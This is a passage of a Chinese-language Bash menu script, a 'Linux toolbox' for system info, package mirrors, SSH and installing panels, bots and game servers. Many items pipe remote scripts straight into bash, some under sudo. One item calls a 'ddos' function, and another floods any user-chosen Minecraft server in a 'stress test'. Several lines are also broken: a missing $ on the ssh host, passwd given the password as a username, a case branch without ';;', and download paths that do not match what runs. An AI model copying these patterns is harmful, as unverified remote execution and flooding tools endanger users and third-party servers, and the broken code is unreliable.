        $habit --msgbox "无效的输入。" 0 0
        esc
        ;;
  esac
done
}

# 显示服务器配置信息
show_server_config() {
    clear
    echo "=== 服务器配置信息 ==="
    echo "CPU核心数:"
    lscpu | grep -w "CPU(s):" | grep -v "\-"
    lscpu | grep -w "Model name:"
    echo "CPU频率:"
    lscpu | grep -w "CPU MHz"
    echo "虚拟化类型:"
    lscpu | grep -w "Hypervisor vendor:"
    echo "系统版本:"
    if [ -f /etc/lsb-release ]; then
        . /etc/lsb-release
        echo "Ubuntu $DISTRIB_RELEASE"
    elif [ -f /etc/debian_version ]; then
        DEBIAN_VERSION=$(cat /etc/debian_version)
        echo "Debian $DEBIAN_VERSION"
    elif [ -f /etc/centos-release ]; then
        CENTOS_VERSION=$(cat /etc/centos-release)
        echo "CentOS $CENTOS_VERSION"
    else
        echo "无法识别的系统类型"
    fi
    echo "内存信息:"
    free -h
    echo "硬盘信息:"
    df -h
}

# neofetch工具
ifneofetch() {
  #检查neofetch/fastfetch
    test_neofetch
    test_fastfetch
  #显示内容
    clear;br
    echo "neofetch"
    neofetch
    br;echo "fastfetch"
    fastfetch
    br;read -p "回车键返回。"
}

# 一键修改密码
change_password() {
    username=$(whoami)
    sudo passwd "$username"
    echo "密码已成功修改。"
}


# 同步上海时间函数
sync_shanghai_time() {
    install_ntpdate
    echo "正在同步上海时间..."
    sudo timedatectl set-timezone Asia/Shanghai
    sudo ntpdate cn.pool.ntp.org
    echo "时间同步完成。"
}

# 获取操作系统信息的函数
get_os_info() {
    br
    if [ -f /etc/os-release ]; then
        source /etc/os-release
        echo -e "操作系统: $green $PRETTY_NAME$ color"
        echo "ID: $ID"
        echo "版本: $VERSION_ID"
        echo "$sys"
        echo "软件包管理方式: $deb_sys"
    elif command -v termux-info >/dev/null 2>&1; then
        echo -e "操作系统: $green Android (Termux) $color"
        echo "当前系统: $sys"
        echo "通过 termux-info 获取更多信息:"
        echo "请输入termux-info查看"
    else
        echo "-_-无法获取操作系统信息。"
    fi
    br

}


# 检查
introduce() {
    #export LANG=zh_CN.UTF-8 # 设置编码为中文。
    termux_PATH #termux环境变量设置
    PATH_set #环境变量设置
    source $nasyt_dir/.config # 加载脚本配置
    check_pkg_install # 检查包管理器。
    check_script_folder # 检查脚本文件夹。
    main_install # 检查dialog figlet whiptail是否安装。
    check_Script_Install # 检查本脚本是否安装。
}

# 开始
index_main() {
    introduce # 检查
    if [[ $shell_skip == 1 ]]; then
        echo "已跳过"
    else
        menu_jc # 菜单发布页
        get_os_info # 获取操作系统
        ad_gg #广告
        habit_xz #选择使用习惯。
        br
        read -p "回车键启动脚本,Ctrl+C退出" 
    fi
    source $nasyt_dir/.config & # 加载脚本配置
    source $HOME/.bashrc & # 加载用户启动文件
    clear
    while true
    do
        clear
        show_menu  # 主菜单
        case $choice in
            csh)
                csh ;;
                # 工具箱初始化
            1)
                # 查看功能
                while true
                do
                    clear
                    look_menu
                    cw
                    case $look_choice in
                        1) uptime_cn;;
                        2) show_server_config;;
                        3) dialog --msgbox "$(curl iplark.com)" 0 0 ;;
                        4) ifneofetch ;;
                        5) $habit --msgbox "$(curl -sSL https://slow-api.class2.icu/ip.php)" 0 0;;
                        0) break ;;
                        *) break ;;
                    esac
                done
                ;;
            2)
                while true
                do
                    clear
                    system_menu
                    case $system_choice in
                        1)
                            while true
                            do
                                clear
                                deb_install
                                case $deb_install_xz in
                                    1)
                                        clear
                                        deb_install_Internet
                                        esc
                                        ;;
                                    2)
                                        clear
                                        deb_install_localhost
                                        esc
                                        ;;
                                    3)
                                        clear
                                        deb_remove
                                        esc
                                        ;;
                                    0)
                                        clear
                                        break
                                        ;;
                                    *)
                                        cw
                                        break
                                        ;;
                                esac
                            done
                            ;;
                        2)
                            $habit --msgbox "确定更换下载源" 0 0
                            if command -v termux-change-repo >/dev/null 2>&1; then
                               $habit --msgbox "检测到termux环境,是否启动termux-change-repo工具" 0 0
                               termux-change-repo
                            else
                            bash <(curl -sSL https://linuxmirrors.cn/main.sh)
                            fi
                            ;;
                        3)
                            $habit --title "确认操作" --yesno "确定更新软件包及系统吗？" 0 0
                            if [ $? -ne 0 ]; then
                                break
                            fi
                            br
                            $pkg_install upgrade $yes_tg
                            $pkg_install update $yes_tg
                            br
                            esc
                            ;;
                        4)
                            while true
                            do
                                clear
                                zip_menu
                                read -p "请选择: " zip_menu_xz
                                case $zip_menu_xz in
                                    1)
                                        clear
                                        ls_input_2=$(ls)
                                        ls_print=$ls_input2
                                        echo "可能没啥用";br
                                        ls;
                                        zip_zip=$(dialog --title "zip解压" \
                                        --inputbox "$ls_print请输入文件地址" 10 50 \
                                        2>&1 1>/dev/tty)
                                        echo $zip_zip
                                        unzip $zip_zip; br
                                        echo "解压文件成功"; esc
                                        ;;
                                    2)
                                        clear; br; ls; br
                                        echo "请输入文件地址(/**/**.tar.gz)"
                                        read tar_gz_xz; br
                                        tar -xzvf $tar_gz_xz; br
                                        echo "解压文件完成"; esc
                                        ;;
                                    0)
                                        break
                                        ;;
                                    *)
                                        cw
                                        break
                                        ;;
                                esac
                            done
                            ;;
                        5)
                            while true
                            do
                                clear
                                ssh_tool_menu
                                read -p "请选择:" ssh_tool_xz
                                case $ssh_tool_xz in
                                    1)
                                        clear; br
                                        read -p "请输入IP: " ssh_tool_ip
                                        read -p "请输入端口: " ssh_tool_port
                                        read -p "请输入用户: " ssh_tool_user; br
                                        echo "正在连接 $ssh_tool_ip 服务器中。"; br
                                        ssh -p $ssh_tool_port $ssh_tool_user@ssh_tool_ip; br
                                        echo "连接已断开"; esc
                                        ;;
                                    2)
                                        echo "正在启动ssh中"
                                        sshd; echo "启动完成。"; esc
                                        ;;
                                    3)
                                        clear; br
                                        ssh_tool_passwd=$($habit --title "设置密码" \
                                        --inputbox "请输入要修改的密码" 0 0 \
                                        2>&1 1>/dev/tty)
                                        sudo passwd $ssh_tool_passwd
                                        if [ $? -ne 0 ]; then
                                            $habit --msgbox "密码修改失败" 0 0
                                            break
                                        fi
                                        $habit --msgbox "修改密码为 $ssh_tool_passwd 成功。" 0 0
                                        esc
                                        ;;
                                    0)
                                        break
                                        ;;
                                    *)
                                        cw
                                        break
                                        ;;
                                esac
                            done
                            ;;
                        6)
                           java_install_menu
                           $habit --yesno "你确定要安装java_$java_install_xz 吗？" 0 0
                            if [ $? -ne 0 ]; then
                                break
                            fi
                           $pkg_install openjdk-$java_install_xz-jre-headless $yes_tg;;
                        7)
                            language_menu () {
                            clear; br
                            dialog --msgbox "当前只适配了基于 CentOS/Debian的系统\n其他系统的可以尝试一下。" 0 0
                            case $deb_sys in
                               apt)
                                  echo "正在使用 $deb_sys 下载中文汉化包。"
                                  sudo apt install task-chinese-s task-chinese-t
                                  $habit --msgbox "请在接下来的页面内\n切换到zh_CN.UTF-8选项" 0 0
                                  sudo dpkg-reconfigure locales
                                  ;;
                               dnf)
                                  $habit --msgbox "检测到当前系统为CentOS8以上" 0 0
                                  sudo dnf groupinstall "Chinese Support"
                                  ;;
                               yum)
                                  $habit --msgbox "检测到当前系统为CentOS" 0 0
                                  sudo yum groupinstall "Chinese Support"
                                  ;;
                               *)
                                  $habit --msgbox "检测到当前系统为$sys \n有可能\n但是可以尝试一下。" 0 0
                                  $pkg_install dpkg-reconfigure locales $yes_tg
                                  export LANG=zh_CN.UTF-8
                                  esc
                                  ;;
                            esac
                               # 配置语言环境
                                  echo "配置语言环境..."
                                  if [[ "$OS" == "ubuntu" || "$OS" == "debian" || "$OS" == "kali" || "$OS" == "linuxmint" ]]; then
                                       update-locale LANG=zh_CN.UTF-8
                                  elif [[ "$OS" == "centos" || "$OS" == "rhel" || "$OS" == "fedora" || "$OS" == "ol" ]]; then
                                       localectl set-locale LANG=zh_CN.UTF-8
                                  else
                                       echo "无法识别发行版，尝试使用update-locale。"
                                       if command -v update-locale &> /dev/null; then
                                          update-locale LANG=zh_CN.UTF-8
                                       else
                                          echo "无法配置语言环境，请手动配置。"
                                       fi
                                  fi
                            esc
                            $habit --msgbox "脚本执行结束" 0 0
                            }
                            language_menu
                            ;;
                            
                        0)
                            clear
                            break
                            ;;
                        *)
                            cw
                            break
                            ;;
                    esac
                done
                ;;
            
            3)
                while true
                do
                    clear
                    Internet_tool
                    case $Internet_tool in
                        1) 
                            ping2
                            esc
                            ;;
                        2)
                            cc
                            esc
                            ;;
                        3)
                            # tmux工具
                            tmux_tool_index
                            ;;
                        4)
                            awk -f <(curl -L gitee.com/mo2/linux/raw/2/2.awk)
                            esc
                            ;;
                        5)
                            clear
                            nmap_menu
                            esc
                            ;;
                        6)
                            clear
                            ranger_install
                            esc
                            ;;
                        7)
                            $habit --msgbox "目前只有安装服务" 0 0
                            test_hashcat
                            ;;
                        8)
                            $habit --msgbox "目前只有安装服务" 0 0
                            test_burpsuite
                            ;;
                        0) 
                            break
                            ;;
                        *)
                            $habit --msgbox "无效的输入。" 0 0
                            esc
                            ;;
                    esac
                done
                ;;
            4)
                while true
                do
                    clear
                    often_tool
                    case $often_tool_choice in
                        1)
                            clear
                            curl -fsSL "https://alist.nn.ci/v3.sh" -o v3.sh
                            bash v3.sh
                            esc
                            ;;
                        2) 
                            clear
                            if [ -f /usr/bin/curl ]; then
                                curl -sSO https://download.bt.cn/install/install_panel.sh
                            else
                                wget -O install_panel.sh https://download.bt.cn/install/install_panel.sh
                            fi
                            bash install_panel.sh ed8484bec
                            read -p "安装bt完成 回车键返回。"
                            ;;
                        3) 
                            clear
                            wget http://dl.amh.sh/amh.sh
                            bash amh.sh acc 48677
                            esc
                            ;;
                        4)
                            while true
                            do
                                clear
                                1panel
                                read -p "请选择你的系统: " 1panel_xz
                                case $1panel_xz in
                                    1)
                                        curl -sSL https://resource.fit2cloud.com/1panel/package/quick_start.sh -o quick_start.sh && sh quick_start.sh
                                        esc
                                        ;;
                                    2)
                                        curl -sSL https://resource.fit2cloud.com/1panel/package/quick_start.sh -o quick_start.sh
                                        sudo bash quick_start.sh
                                        esc
                                        ;;
                                    3)
                                        curl -sSL https://resource.fit2cloud.com/1panel/package/quick_start.sh -o quick_start.sh
                                        bash quick_start.sh
                                        esc
                                        ;;
                                    4)
                                        echo "安装 docker中"
                                        bash <(curl -sSL https://linuxmirrors.cn/docker.sh)
                                        clear; echo "安装 1Panel中"
                                        curl -sSL https://resource.fit2cloud.com/1panel/package/quick_start.sh -o quick_start.sh && sh quick_start.sh
                                        esc
                                        ;;
                                    0)
                                        break
                                        ;;
                                    *)
                                        clear
                                        dialog --msgbox "无效的输入。" 0 0
                                        esc
                                        ;;
                                esac
                            done
                            ;;
                        5)
                            sudo su -c "wget -qO- https://script.mcsmanager.com/setup_cn.sh | bash"
                            esc
                            ;;
                        6) 
                            clear
                            cpolar_instell
                            esc
                            ;;
                        7)
                            clear
                            ddos
                            esc
                            ;;
                        8)
                            while true
                            do
                               Secluded_menu
                               case $Secluded_menu_xz in
                                  1)
                                      test_git #检查git是否安装函数
                                      if [ -e "$nasyt_dir/Secluded/SecludedLauncher.out.sh" ]; then
                                        $habit --msgbox "Secluded已安装>_<" 0 0
                                      else
                                        $habit --title "确认操作" --yesno "确定安装Secluded吗？\nSecluded将会安装到以下目录\n$nasyt_dir/Secluded" 0 0
                                            if [ $? -ne 0 ]; then
                                                $habit --msgbox "取消操作" 0 0
                                                break
                                            fi
                                        cd $HOME #切换到根目录。
                                        $habit --title "确认操作" --yesno "你的服务器位于 <国外>还是<国内>？\n国内请选择yes 国外请选择no" 0 0
                                            if [ $? -ne 0 ]; then
                                                git clone https://github.com/MCSQNXY/Secluded-x64-linux.git $nasyt_dir/Secluded
                                            else
                                                git clone https://ghfast.top/https://github.com/MCSQNXY/Secluded-x64-linux.git $nasyt_dir/Secluded
                                            fi
                                        echo "chmod 777 "$nasyt_dir/Secluded/SecludedLauncher.out"" > $nasyt_dir/sec
                                        echo "LD_LIBRARY_PATH=$HOME/.nasyt/Secluded; cd $nasyt_dir/Secluded && ./SecludedLauncher.out" >> $nasyt_dir/sec
                                        chmod 777 "$nasyt_dir/sec"
                                        $habit --msgbox "Secluded安装完成,请重启终端以生效\n启动命令为sec" 0 0
                                      fi
                                    ;;
                                 2)
                                    bash sec
                                    br
                                    read -p "按回车键返回。"
                                    $habit --msgbox "脚本执行完毕" 0 0
                                    ;;
                                 3)
                                    $habit --title "确认操作" --yesno "你确定要删除Secluded吗？" 0 0
                                        if [ $? -ne 0 ]; then
                                            break
                                        fi
                                    echo "正在删除Secluded"
                                    rm $nasyt_dir/sec
                                    rm -rf $nasyt_dir/Secluded
                                        if [ $? -ne 0 ]; then
                                            $habit --msgbox "删除失败,请手动删除。" 0 0
                                        else
                                            $habit --msgbox "Secluded删除成功>_<" 0 0
                                        fi
                                    ;;
                                 4)
                                    $habit --msgbox "暂未开发" 0 0
                                    ;;
                                 0)
                                    break
                                    ;;
                              esac
                            done
                            ;;
                        9)
                            while true
                            do
                                clear
                                TRSS
                                read -p "请选择: " TRSS_xz
                                case $TRSS_xz in
                                    1)
                                        clear
                                        echo "正在安装中..."
                                        bash <(curl -L gitee.com/TimeRainStarSky/TRSS_AllBot/raw/main/Install-Docker.sh)
                                        esc
                                        ;;
                                    2)
                                        clear
                                        echo "请到官方查看食用教程"
                                        echo "https://trss.me/Install/TMOE.html"
                                        read -p "回车键继续。"
                                        awk -f <(curl -L gitee.com/mo2/linux/raw/2/2.awk)
                                        esc
                                        ;;
                                    3)
                                        clear
                                        tsab
                                        esc
                                        ;;
                                    0)
                                        clear
                                        break
                                        ;;
                                    *)
                                        clear
                                        dialog --msgbox "无效的输入。" 0 0
                                        esc
                                        ;;
                                esac
                            done
                            ;;
                        10)
                            while true
                            do
                                clear
                                astrbot
                                read -p "请选择你的系统: " astrbot_xz
                                case $astrbot_xz in
                                    1)
                                        bash <(curl -sSL https://gitee.com/mc_cloud/mccloud_bot/raw/master/mccloud_install.sh)
                                        esc
                                        ;;
                                    2)
                                        wget -O - https://gitee.com/mc_cloud/mccloud_bot/raw/master/mccloud_install_u.sh | bash
                                        esc
                                        ;;
                                    3)
                                        clear;echo "正在克隆github仓库。"
                                        git clone https://github.com/AstrBotDevs/AstrBot
                                        cd AstrBot
                                        echo "添加python环境"
                                        python3 -m venv ./venv
                                        source venv/bin/activate
                                        br;echo "正在安装依赖。"
                                        python3 -m pip install -r requirements.txt -i https://mirrors.tuna.tsinghua.edu.cn/pypi/web/simple
                                        clear;br;echo "正在启动astrbot";python main.py
                                        ;;
                                    4)
                                        cd AstrBot
                                        source venv/bin/activate
                                        clear;br;echo "正在启动astrbot";python3 main.py
                                        ;;
                                    0)
                                        break
                                        ;;
                                    *)
                                        $habit --msgbox "无效的输入。" 0 0
                                        esc
                                        ;;
                                esac
                            done
                            ;;
                        11)
                            
                            curl -o napcat.sh https://nclatest.znin.net/NapNeko/NapCat-Installer/main/script/install.sh
                            sudo bash napcat.sh --docker n --cli y
                            ;;
                        12)
                            
                            bash <(curl -L gitee.com/TimeRainStarSky/TRSS_OneBot/raw/main/Install.sh)
                            ;;
                        13)
                            $habit --msgbox "欢迎使用SFS服务器安装脚本" 0 0
                            echo "脚本作者:NAS油条"
                            echo "感谢:"
                            echo "SFSGamer(QQ:3818483936)"
                            echo "(๑•॒̀ ູ॒•́๑)啦啦(QQ:2738136724)"
                            echo "github地址:https://github.com/AstroTheRabbit/Multiplayer-SFS"; br
                            $habit --title "确认操作" --yesno "回车键开始安装。" 0 0
                            if [ $? -ne 0 ]; then
                                break
                            fi
                            curl --progress-bar --output sfs -o /$HOME/sfs https://linux.class2.icu/shell/sfs_server
                            mv sfs /usr/bin
                            chmod +x /usr/bin/sfs
                            echo "快捷启动命令为: sfs"
                            clear; echo "正在运行。"; br
                            sfs; br
                            echo "脚本结束。"
                            esc
                            ;;
                        14)
                            $habit --title "确认操作" --yesno "你确定要安装小皮面板吗？" 0 0
                            if [ $? -ne 0 ]; then
                                break
                            fi
                            if [ -f /usr/bin/curl ]; then
                                curl --progress-bar -O https://dl.xp.cn/dl/xp/install.sh
                            else
                                wget --progress-bar -O install.sh https://dl.xp.cn/dl/xp/install.sh
                            fi; bash install.sh
                            esc
                            ;;
                        0)
                            break
                            ;;
                        *)
                            cw
                            break
                            ;;
                    esac
                done
                ;;
            5)
                while true
                do
                    clear
                    app_install
                    case $app_install_xz in
                        1)
                            $habit --msgbox "检测到当前系统为 $sys 是否开始安装？" 0 0
                            sudo $pkg_install ibus-libpinyin $yes_tg
                            $habit --msgbox "输入法安装完成\n请打开桌面查看。" 0 0
                            ;;
                        2)
                            echo "正在安装Blender建模软件"
                            $pkg_install Blender $yes_tg
                            ;;
                        3)
                            $habit --title "确认操作" --yesno "你确定要安装linux应用商店吗？" 0 0
                            if [ $? -ne 0 ]; then
                                break
                            else
                                sudo $pkg_install gnome-software $yes_tg
                                
                            fi
                        0)
                            cw
                            break
                            ;;
                        *)
                            cw
                            break
                            ;;
                    esac
                done
                ;;
            6)
                while true
                do
                    clear
                    Linux_shell
                    case $Linux_shell_xz in
                        1) 
                            if [ -e $nasyt_dir/yzy.sh ]; then
                               chmod +x $nasyt_dir/yzy.sh
                               bash $nasyt_dir/yzy.sh
                            else
                               curl -L https://gitee.com/krhzj/LinuxTool/raw/main/Linux.sh -o Linux.sh
                               chmod +x $nasyt_dir/yzy.sh
                               bash $nasyt_dir/yzy.sh
                            fi
                            esc
                            ;;
                        2) 
                            if [ -e $nasyt_dir/mky.sh ]; then
                               chmod +x $nasyt_dir/mky.sh
                               bash $nasyt_dir/mky.sh
                            else
                               curl -O mky.sh https://linux.mukongyun.com/linux.sh
                               chmod +x mky.sh
                               bash $nasyt_dir/mky.sh
                            fi
                            esc
                            ;;
                        3)
                            if [ -e "$nasyt_dir/MinecraftMotdStressTest/motd_stress_test_optimized.py" ]; then
                               test_python;test_pip #调用函数检测
                               pip_mcstatus;pip_colorama  #调用函数安装/检测
                               br;sleep 1
                               mc_test_ip=$($habit --title "服务器地址" \
                               --inputbox "NAS油条制作\n作者肝疼>_<\n请输入IP或域名" 0 0 \
                               2>&1 1>/dev/tty);
                               if [ $? -ne 0 ];then
                                  break
                               fi
                               mc_test_port=$($habit --title "端口" \
                               --inputbox "请输入服务器端口" 0 0 \
                               2>&1 1>/dev/tty);
                               mc_test_total=$($habit --title "数量" \
                               --inputbox "请输入要测压的数量（1000" 0 0 \
                               2>&1 1>/dev/tty);
                               python $nasyt_dir/MinecraftMotdStressTest/motd_stress_test_optimized.py --host $mc_test_ip --port $mc_test_port --total $mc_test_total
                               read -p "按回车键返回。"
                               $habit --msgbox "脚本运行结束" 0 0
                            else
                               read
                               echo "正在克隆github仓库"
                               read
                               git clone https://github.com/konsheng/MinecraftMotdStressTest.git $nasyt_dir/MinecraftMotdStressTest
                               read
                               echo "正在检查,脚本所需资源"
                               read
                               test_python;test_pip #调用函数安装/检测
                               pip_mcstatus;pip_colorama  #调用函数安装/检测
                               read
                               $habit --msgbox "安装完成,请重新打开脚本" 0 0
                            fi
                            ;;
                        4)
                            $habit --title "确认操作" --yesno "确定运行Docker 安装与换源脚本吗？" 0 0
                            if [ $? -ne 0 ]; then
                                break
                            fi
                            bash <(curl -sSL https://linuxmirrors.cn/docker.sh)
                            ;;
                        5)
                            bash -c "$(curl -L https://gitee.com/nasyt/nasyt-linux-tool/raw/master/cs_shell.sh)"
                            ;;
                        6)
                            while true
                            do
                            termux_kali_install
                            case $termux_kali_install_xz in
                                1)
                                    wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Kali/kali.sh
                                    if [ $? -ne 0 ]; then
                                        $habit --msgbox "网络错误" 0 0
                                        exit
                                    fi
                                    $habit --title "确认操作" --yesno "脚本下载完成是否启动？" 0 0
                                    if [ $? -ne 0 ]; then
                                        break
                                    fi
                                    bash kali.sh
                                    ;;
                                2)
                                    test_git #git检查函数
                                    if [ -e $nasyt_dir/kali_install/AutoInstallKali/kalinethunter ]; then
                                        $habit --title "确认操作" --yesno "当前脚本已安装是否直接启动？" 0 0
                                        if [ $? -ne 0 ]; then
                                            break
                                        fi
                                        chmod 777 $nasyt_dir/kali_install/AutoInstallKali/*
                                        bash $nasyt_dir/kali_install/AutoInstallKali/kalinethunter
                                        read -p "按回车键返回"
                                        $habit --msgbox "脚本执行完毕" 0 0
                                    else
                                        git clone https://gitee.com/zhang-955/clone.git $nasyt_dir/kali_install
                                        chmod 777 $nasyt_dir/kali_install/AutoInstallKali/*
                                        bash $nasyt_dir/kali_install/AutoInstallKali/kalinethunter
                                        read -p "按回车键返回"
                                        $habit --msgbox "脚本执行完毕" 0 0
                                    fi
                                    ;;
                                0)
                                    break
                                    ;;
                            esac
                            done
                            ;;
                        0) 
                            break
                            ;;
                        *)
                            $habit --msgbox "无效的输入" 0 0
                            esc
                            ;;
                    esac
                done
                ;;
            7) 
                gx #脚本更新
                esc
                ;;
            8)
                clear
                gx_log #更新日志
                esc
                ;;
            9)
                while true
                do
                nasyt_setup_menu
                case $nasyt_setup_choice in
                    1)
                        habit_menu
                        case $habit_menu_xz in
                            1) echo "export habit="dialog"" >  $nasyt_dir/.config ;;
                            2) echo "export habit="whiptail"" > $nasyt_dir/.config ;;
                            3) sed -i '/^export=*/d' $nasyt_dir/.config ;;
                            0) cw;break ;;
                        esac
                        ;;
                    2)  
                        $habit --yesno "此操作会删除本脚本\n以及本脚本目录下的工具\n你确定要删除(>_<)本脚本吗？" 0 0
                        rm /usr/bin/nasyt
                        rm -rf $nasyt_dir
                        $habit --msgbox "删除完成\n再见，感谢你的支持。" 0 0
                        exit 1
                        ;;
                    3)
                        if ! grep -q "^export github_speed=" $nasyt_dir/.config; then
                           $habit --msgbox "已存在github加速地址\n并且地址为:\n$github_speed\n是否删除？" 0 0
                           sed -i '/export github_speed=/d' $nasyt_dir/.config
                        else
                           github_speed_address=$($habit --title "github加速地址" \
                           --inputbox "例如: https://ghfast.top/ \n\n请输入" 0 0 \
                           2>&1 1>/dev/tty)
                           if [ $? -ne 0 ]; then
                              break
                           fi
                        fi
                        echo "export github_speed=https://ghfast.top/" >> $nasyt_dir/.config
                        $habit --msgbox "地址添加成功，请重启脚本。" 0 0
                        exit 0
                        ;;
                    9)  
                        rm $nasyt_dir/.config
                        $habit --msgbox "删除配置文件完成。" 0 0
                        ;;
                    0)  break;;
                    *)  cw;break;;
                esac
                done
                ;;
            0)
                break
                clear
                ;;
            esc)
                break
                clear
                ;;
            *)
                break
                ;;
        esac
    done
    clear
}
#
#
#
all_variable # 全部变量
color_variable # 定义颜色变量
# 启动参数
if [ $# -ne 0 ]; then
    case $1 in
    -t|--tmux)
      tmux_tool
      tmux_tool_index
      echo "执行完毕。"
      exit
      ;;
    -s|--skip)
      shell_skip=1
      ;;
    -v|-version|--version)
      echo
      echo "名称: $0"
      echo "版本: $version"
      echo "操作系统: $PRETTY_NAME"
      echo "位于目录: "
      command -v nasyt
      echo
      exit
      ;;
    -h|-help|--help)
      echo
      echo "用法:"
      echo "  nasyt [参数]"
      echo "参数:"
      echo "  -t, --tmux 快捷进入tmux管理"
      echo "  -s, --skip 直接进入菜单部分"
      echo "  -v, --version 输出脚本版本"
      echo "  -h, --help  输出命令帮助"
      echo
      echo "有关更多详细信息，请参见https://gitee.com/nasyt/nasyt-linux-tool"
      exit
      ;;
    *)
      echo "无效的参数"
      echo "$@"
      exit
    esac
fi
index_main # 脚本主程序